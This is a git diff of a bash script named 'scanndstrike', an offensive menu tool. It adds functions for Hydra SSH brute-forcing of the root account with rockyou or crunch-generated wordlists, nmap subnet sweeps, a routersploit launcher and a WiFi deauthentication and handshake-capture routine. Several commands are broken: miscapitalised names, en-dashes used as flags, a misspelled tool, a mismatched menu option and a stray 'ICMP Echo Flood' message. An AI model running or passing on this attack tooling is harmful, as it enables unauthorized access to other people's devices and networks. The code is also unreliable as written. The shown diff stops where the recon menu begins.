@@ -1,33 +1,314 @@
-#!/bin/bash
+#!/bin/bash 
 
-PS3="scannstrike>" #prompt used to identify the program and tell the user they aren't running a bash script
+  
 
-#Create the ScanndStrike Menu
-#Launch the start/main menu
-homemenu()
-{
-#create a menu for the program using bash select, create sub menus within that can be used to run various modules
-homemenu=("Perform Recon" "Execute Denial of Service Attacks" "Execute Attacks on Smart Devices "  "Exit") #creates the sub menu and the output shown to the user
-select opt in "${homemenu[@]}"; do
-        if [ "$opt" = "Exit" ]; then
-        echo "Quitting...Thank you for using scanndstrike!" && sleep 1 && clear
-        exit 0
-        elif [ "$opt" = "Perform Recon" ]; then
-netreconmenu
-        elif [ "$opt" = "Execute Denial of Service Attacks" ]; then
-dosattackmenu
-        else
-#if no valid option is chosen, chastise the user
-        echo "To exit this tool hit Return/Enter! Thank you"
-        fi
-done
-}
-#End of HomeMenu Code
+PS3="scannstrike>" #prompt used to identify the program and tell the user they aren't running a bash script 
 
-#################
-# Sub Menu Code #
-#################
+  
 
+#Create the ScanndStrike Menu 
+
+#Launch the start/main menu 
+
+homemenu() 
+
+{ 
+
+#create a menu for the program using bash select, create sub menus within that can be used to run various modules 
+
+homemenu=("Perform Recon" "Execute Denial of Service Attacks" "Execute Attacks on Smart Devices"  "Exit") #creates the sub menu and the output shown to the user 
+
+select opt in "${homemenu[@]}"; do 
+
+        if [ "$opt" = "Exit" ]; then 
+
+        echo "Quitting...Thank you for using scanndstrike!" && sleep 1 && clear 
+
+        exit 0 
+
+        elif [ "$opt" = "Perform Recon" ]; then 
+
+netreconmenu 
+
+        elif [ "$opt" = "Execute Denial of Service Attacks" ]; then 
+
+dosattackmenu 
+
+        elif [ "$opt" = "Execute Attacks on Smart Devices" ]; then 
+
+ethhackmenu 
+
+        else 
+
+#if no valid option is chosen, chastise the user 
+
+        echo "To exit this tool hit Return/Enter! Thank you" 
+
+        fi 
+
+done 
+
+} 
+
+#End of HomeMenu Code 
+
+  
+
+################# 
+
+# Sub Menu Code # 
+
+################# 
+
+  
+
+#Start of the EthHack Menu Code 
+
+ethhackmenu() 
+
+{ 
+
+#build a menu for theb attack modules using bash select 
+
+                ethhackmenu=("SSH Exploit Nmap" "SSH Exploit Hydra" "Wifi Password Cracking" "Wordlist Creation" "Router Exploit" "Go back") 
+
+        select ethopt in "${ethhackmenu[@]}"; do 
+
+  
+
+#Perform SSH Explot using nmap 
+
+        if [ "$ethopt" = "SSH Exploit" ]; then  
+
+                sshexploit 
+
+#SSH Hydra 
+
+    elif [ "$ethopt" = "SSH Exploit Hydra" ]; then 
+
+        sshydra   
+
+  
+
+#Perform Wifi Cracking with WIFITE 
+
+    elif [ "$ethopt" = "Wifi Password Cracking" ]; then 
+
+        passcrack 
+
+  
+
+#Create a custom wordlist for password cracking tools 
+
+    elif [ "$ethopt" = "Wordlist Creation" ]; then 
+
+        crunchlist 
+
+  
+
+#Perfrom Recon on a Router and exploit any available vulnerabilities 
+
+    elif [ "$ethopt" = "Router Exploit" ]; then 
+
+        routerexp 
+
+#Go back 
+
+        elif [ "$ethopt" = "Go back" ]; then 
+
+                homemenu 
+
+## Default if no menu option selected is to return an error 
+
+        else 
+
+                echo  "That's not a valid option! Hit Return/Enter to show menu" 
+
+        fi 
+
+        done 
+
+} 
+
+  
+
+routerexp() 
+
+{ 
+
+echo "Lets see if this works hm" 
+
+cd routersploit 
+
+echo "Test" 
+
+sudo python3 rsf.py 
+
+echo "Wellll well ya bastard" 
+
+  
+
+echo "" 
+
+echo "" 
+
+} 
+
+  
+
+passcrack() 
+
+{ 
+
+echo "Hello" 
+
+Ifconfig  
+
+  
+
+sudo aircrack-ng start wlan0  
+
+  
+
+sudo Ifconfig wlan0mon down  
+
+  
+
+sudo iwconfig wlan0mon mode monitor  
+
+  
+
+sudo ifconfig wlan0mon up  
+
+echo "" 
+
+sudo airodump-ng wlan0mon  
+
+echo"" 
+
+read -i $FILE -e FILE 
+
+read -i $CHANNEL -e CHANNEL 
+
+read -i $TARGET -e TARGET 
+
+echo "PLease open a secondary window an paste the following command" 
+
+echo "Sudo airoplay-ng –deauth 0 –a" $TARGET "wlan0mon" 
+
+echo "Now press enter to run the command and when you see WPA handshake has been captured stop" 
+
+Sudo airmon-ng –w $FILE  –c $CHANNEL  –bssid $NETWORK  wlan0mon  
+
+} 
+
+  
+
+sshydra() 
+
+{ 
+
+echo "Please enter a target hostname or IP address:" 
+
+#IP address/hostname of the target is required to begin 
+
+                 read -i $HOST -e HOST 
+
+#Here we are running a scan of all devices connected to the target network that have the ports 80, 81, 8080 and 8081 running 
+
+                sudo nmap $HOST/24 -p 80,81,8080,8081 
+
+#While this does return important information it also reveals alot about devices with closed ports that wont be useful to us so we can run a secondary scan to show only open ports excluding closed and filtered ports 
+
+sudo nmap $HOST/24 -p 80,81,8080,8081 --open 
+
+echo "From the list of target devices shown connected to the network choose ones IP address to perfrom further scans on" 
+
+read -i $TARGET -e TARGET  
+
+echo "Now that you have chosen your target to attack we can run an advanced scan to reveal additional information about it" 
+
+sudo nmap -sV $TARGET 
+
+echo "Now that we have finished recon of the target we can begin the attack with Hydra" 
+
+#Define whether the user wants to use a custom wordlist, default wordlist, create a wordlist now, or run a fast ssh exploit with a default wordlist 
+
+echo "Hydra incorporates the use of password lists when attempting to break into a ssh connection this means custom wordlists/password lists  can be used based on information you may known about the victim of this attack" 
+
+echo "Enter the name of your wordlist, [d]efault wordlist, [c]reate a wordlist now and use it or [f]ast track the attack with default wordlist and port specification" 
+
+        read -i $SOURCE -e SOURCE 
+
+        : ${SOURCE:=i} 
+
+        if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then 
+
+                echo "You must enter a valid textfile" 
+
+                hydra -l root -P  $SOURCE  $TARGET -t 4 ssh  
+
+        elif [ "$SOURCE" = "d" ]; then 
+
+                echo "Starting Hydra SSH Exploit. Use 'Ctrl c' to end and return to menu" 
+
+                hydra -l root -P  /usr/share/wordlists/rockyou.txt  $TARGET -t 4 ssh  
+
+        elif [ "$SOURCE" = "f" ]; then   
+
+                echo "Starting Hydra SSH Exploit. Use 'Ctrl c' to end and return to menu" 
+
+                hydra -s 22 -l root -P  nowtest  $TARGET  -t 4 -e nsr ssh 
+
+        elif [ "$SOURCE" = "c" ]; then 
+
+                echo "PLease choose a name for your wordlist" 
+
+                read -i $LIST -e LIST 
+
+                echo "Now, please choose the string you wish to use for your list of combinations e.g if you enter 12ab you will be creating a list containing all possible combinations of the letters and numbers within that string" 
+
+                read -i $CRUNCH -e CRUNCH 
+
+                crunch 4 4 $CRUNCH  -o Documents/$LIST 
+
+                echo "Starting Hydra SSH Exploit. Use 'Ctrl c' to end and return to menu" 
+
+                hydra -l root -P  Documents/$LIST  $TARGET -t 4 ssh  
+
+        else echo "Not a valid option! Using " 
+
+                echo "Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu" 
+
+                hydra -l root -P  /usr/share/wordlists/rockyou.txt  $TARGET -t 4 ssh  
+
+        fi 
+
+} 
+
+crunchlist() 
+
+{ 
+
+echo "Here we can create lists that can be later called upon for password cracking using Crunch" 
+
+echo "Please enter the digits and characters you want this list to be made from e.g entering 123ABCabc will create a list of passwords made from every possible combination of this string" 
+
+read -i $CRUNCH -e CRUNCH 
+
+echo "Now that you have chosen the digits and characters for your password list you can assign a file for the passwords to be sent once compiled e.g mypass.txt" 
+
+read -i $TEXT -e  TEXT 
+
+crunch 4 4 $CRUNCH  -o Documents/$TEXT 
+
+echo "" 
+
+echo "You have  just created a password list ! These can be called upon when perfroming various penetration tests on your network/devices" 
+
+echo "You can view this password list by entering cd Documents/"$TEXT  "into the command line once you have  exited this program" 
+
+} 
 
 #Start of the NetRecon Menu Code
 netreconmenu()
